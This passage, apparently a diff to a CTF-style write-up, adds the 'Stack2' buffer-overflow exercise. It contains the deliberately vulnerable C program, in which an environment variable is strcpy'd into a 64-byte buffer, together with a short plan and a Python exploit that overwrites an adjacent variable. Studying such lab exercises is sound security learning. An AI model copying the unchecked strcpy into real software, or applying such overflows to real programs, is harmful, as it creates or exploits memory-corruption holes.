@@ -101,3 +101,65 @@ input=fill+'\x64\x63\x62\x61'
 cproc = Popen(["./stack1",input], stdin=PIPE, stdout=PIPE)
 print cproc.communicate()[0]
 ```
+
+
+
+
+#Stack2
+---------------------------------------
+###Source Code:
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+  char *variable;
+
+  variable = getenv("GREENIE");
+
+  if(variable == NULL) {
+      errx(1, "please set the GREENIE environment variable\n");
+  }
+
+  modified = 0;
+
+  strcpy(buffer, variable);
+
+  if(modified == 0x0d0a0d0a) {
+      printf("you have correctly modified the variable\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+
+}
+```
+###Stack:
+| eip | ebp | modified(0) |   buffer    | variable pointer|
+
+###Plan:
+Use an environment variable to overflow buffer via strcpy and fill modified with correct value.
+
+###winning command:
+```bash
+
+```
+###Python exploit:
+```Python
+from subprocess import Popen, PIPE
+import os
+################
+buffer = 64
+fill = "A"*buffer
+input=fill+'\x0a\x0d\x0a\x0d'
+print(input)
+os.environ ["GREENIE"]=input
+#################
+cproc = Popen("./stack2", stdin=PIPE, stdout=PIPE)
+print cproc.communicate()[0]
+```
+
